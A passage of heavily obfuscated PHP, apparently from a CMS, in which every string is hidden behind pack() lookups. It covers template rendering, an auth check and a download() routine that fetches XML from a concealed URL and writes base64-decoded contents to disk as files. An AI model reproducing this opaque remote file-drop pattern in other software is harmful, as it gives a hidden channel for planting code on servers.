pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x28]):$url=$config->url;$from1=$config->from;if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][046])){$h=file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][41]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]));}if($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])]==1&&is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][41]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]))){$h=file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][41]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][10]));}else{$h=file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][41]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]));}$h=trim($h,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][14]));if($b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B])&&$b!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034])){$footpart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x1B]),1,$type);$toppart=a(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][034]),1,$type);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][035]),$footpart,$h);$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][30]),$toppart,$h);}else{return $h;}break 1;}$html=$h;switch($type){case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][1]):$t=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][1]);$tp=$C_wap;$wap=true;$p=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][8]),$page);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][31]):$t=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][42]);$tp=$C_template;$wap=false;$p=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][8]),$page);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][045]):$t=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][42]);$tp=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][045]);$wap=false;$p=$b;$H_data[0][pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][43])]=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][045]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x28]):$t=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][42]);$tp=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x28]);$wap=false;$p=$b;$H_data[0][pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][43])]=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x28]);break 1;}$data2=array(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][054])=>md5(file_get_contents($C_dirx.$t. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$tp. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$p. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][013])).file_get_contents($C_dirx.$t. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$tp. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][45])).file_get_contents($C_dirx.$t. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][13]) .$tp. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x2E]))),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][057])=>json_decode(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x30])))->from,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][49])=>intval(json_decode(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x30])))->id),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][50])=>$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])],pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][1])=>$wap,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][063])=>$p,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][52])=>$key,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x35])=>$H_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x36])=>$W_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][55])=>$L_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][56])=>$S_data);$md5=md5(base64_encode(json_encode($data2)));$data=array(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x39])=>$html,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][057])=>json_decode(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x30])))->from,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][49])=>intval(json_decode(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x30])))->id),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])=>$_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])],pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][50])=>$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])],pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][072])=>qqkefu(),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][1])=>$wap,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][073])=>langx($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])],$_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3C])]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][063])=>$p,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][52])=>$key,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x35])=>$H_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x36])=>$W_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][55])=>$L_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][56])=>$S_data,pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3D])=>$md5);if(is_file($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3E]) .$p. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3F]) .$tp. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3F]) .langx($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])],$_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3C])]). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x40]))){if(substr(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3E]) .$p. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3F]) .$tp. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3F]) .langx($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])],$_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3C])]). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x40])),0,32)!=$md5){ajax(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0101]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0102]),base64_encode(json_encode($data)));}}else{ajax(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0101]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0102]),base64_encode(json_encode($data)));}$h=base64_decode(substr(file_get_contents($C_dirx. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3E]) .$p. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3F]) .$tp. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3F]) .langx($_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x9])],$_SESSION[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x3C])]). pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x40])),32));switch($type){case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][1]):if($C_mipon==1){$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0104]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][69]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][70]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][71]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0110]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x49]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][70]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][71]),$h);}if($C_tj_id!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][8])){$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0112]) .$C_tj_id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][75]),$h);}break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][31]):if($C_mipon==1){$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0104]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][69]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][70]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][71]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0110]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x49]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][70]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][71]),$h);}if($C_tj_id!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][8])){$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0112]) .$C_tj_id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][75]),$h);}break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][045]):if($C_html==1||$C_html==2){switch($b){case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][76]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir;break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x4E]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x4F]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][80]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x51]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x52]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x53]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0125]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0126]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][87]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][88]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x59]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][90]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0133]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][92]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][93]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][94]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;}$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0137]) .$url. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0140]) .$url. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0141]),$h);}else{$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x62]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][99]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][70]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][71]),$h);}break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x28]):if($C_html==1||$C_html==2){switch($b){case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][76]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir;break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x4E]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x4F]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][80]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x51]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x52]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x53]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0125]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0126]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][87]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][88]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x59]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][90]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0133]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][92]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;case pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][93]):$url=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0115]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][94]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][84]);break 1;}$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0137]) .$url. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0140]) .$url. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0141]),$h);}else{$h=str_replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]) .PHP_EOL. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x62]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])].$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][99]) .$b. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][70]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][71]),$h);}break 1;}if($b==pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][93])&&$type!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x28])&&$type!=pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][045])){$h=str_Replace(pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][67]),pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0144]) .$C_dir. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x65]) .$id. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][102]) .$_SERVER[pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x16])]. pack($GLOBALS[KRYVgMQ][00],$GLOBALS[KRYVgMQ][0x67]),$h);}return $h;}function check_auth2($str){if(!isset($_SESSION[pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][0x1])])){ajax(pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][0x1]),pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][0x2]));}$a=$_SESSION[pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][0x1])];if($str==pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][03])||$str==pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][4])||strpos(decodex($a),pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][0x5]))===false){if(strpos(pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][06]) .decodex($a). pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][06]),pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][06]) .$str. pack($GLOBALS[fUBiIlQ][0x0],$GLOBALS[fUBiIlQ][06]))!==false){$c=true;}else{$c=false;}}else{$c=true;}return $c;}Function download($T_type,$T_id){global $C_authcode;$strLocalPath=pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][0x1]) .$T_type. pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][02]) .$T_id. pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][02]);flush();ob_flush();$url=pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][0x3]) .$T_id. pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][04]);$GLOBALS[pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][0x5])]=GetHttpContent($url);if($GLOBALS[pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][0x5])]){$xml=simplexml_load_string($GLOBALS[pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][0x5])],pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][06]));$old=umask(0);foreach($xml->file as $f){$filename=$strLocalPath.$f->path;$filename=str_replace(pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][7]),pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][02]),$filename);$dirname=dirname($filename);if(!is_dir($dirname)){mkdir($dirname,0755,true);}$fn=$filename;file_put_contents($fn,base64_decode($f->stream));}umask($old);}else{exit(pack($GLOBALS[BlqyXiJ][00],$GLOBALS[BlqyXiJ][0x8]));}}function ready($str){global $conn,$config,$auth4,$au2,$C_webtitle,$C_webtitle2,$C_keywords,$C_description,$C_logo,$C_code,$C_template,$C_wap,$C_first,$C_admin,$C_foot,$C_logox,$C_logoy,$C_ico,$C_qq,$C_qqon,$C_member,$C_top,$C_mobile,$C_wcode,$C_wtitle,$C_wtoken,$C_lang,$C_delang,$C_fenxiang,$C_email,$C_mailtype,$C_mpwd,$C_smtp,$C_html,$C_dir,$C_dirx,$C_npage,$C_ppage,$C_alipayon,$C_wxpayon,$C_bankon,$C_balanceon,$C_alipay,$C_alipaykey,$C_alipayid,$C_qqid,$C_qqkey,$C_weibo,$C_wx_appid,$C_wx_mchid,$C_wx_key,$C_wx_appsecret,$C_domain,$C_todomain,$C_time,$C_close,$C_1yuan,$C_read,$C_1yuan2,$C_sign,$C_Invitation,$C_data,$C_gift,$C_gifton,$C_tp,$C_np,$C_pp,$C_td,$C_nd,$C_pd,$C_pid,$C_mark,$C_m_position,$C_m_text,$C_m_font,$C_m_size,$C_m_color,$C_m_logo,$C_m_width,$C_m_height,$C_m_transparent,$C_7PID,$C_7PKEY,$C_ds1,$C_ds2,$C_ds3,$C_7money,$C_sort,$C_tag,$C_db,$C_tomoney,$C_tofen,$C_tx,$C_tomoney_rate,$C_tofen_rate,$C_tx_rate,$C_qqkj,$C_wxkj,$C_psh,$C_wxapptitle,$C_wxappID,$C_wxappSecret,$C_authcode,$C_translate,$C_memberbg,$C_flag,$C_hotwords,$C_nsorttitle,$C_nsortentitle,$C_psorttitle,$C_psortentitle,$C_userid,$C_codeid,$C_codekey,$C_smssign,$C_need,$C_paypal,$C_paypalon,$C_wxapplogo,$C_wxappno,$C_wxapptabbar,$C_wxcolor,$C_langtitle,$C_langtag,$C_reg1,$C_reg2,$C_reg3,$C_kfon,$C_osson,$C_oss_id,$C_oss_key,$C_bucket,$C_region,$C_regon,$C_kefuyun,$C_langcode,$C_beian,$C_postage,$C_baoyou,$C_checkaddress,$C_rate,$C_https,$C_mipon,$C_mip_token,$C_tj_account,$C_tj_pwd,$C_tj_id,$C_tj_siteid,$C_tj_token,$C_bj_id,$C_bj_key,$C_qe_id,$C_qe_key,$W_show,$W_phone,$W_email,$W_msg,$W_logo,$C_title,$C_entitle,$C_content3,$C_map,$C_zb,$C_address,$C_dfon,$C_zzon,$C_shou